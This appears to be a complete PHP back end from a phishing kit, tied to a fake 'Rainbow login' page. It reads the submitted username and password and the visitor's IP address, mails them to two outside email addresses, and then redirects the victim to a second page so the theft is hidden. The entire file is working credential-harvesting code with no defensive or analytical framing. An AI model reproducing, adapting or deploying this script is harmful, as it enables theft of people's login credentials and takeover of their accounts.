<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Rainbow login || :------\n";
$message .= "User: ".$_POST['textinput']."\n";
$message .= "Password: ".$_POST['passinput']."\n";
$message .= "----: || THckingE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="housesforsaleinmiami@yandex.com,landscaping9010@gmail.com
";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: index2.html");
?>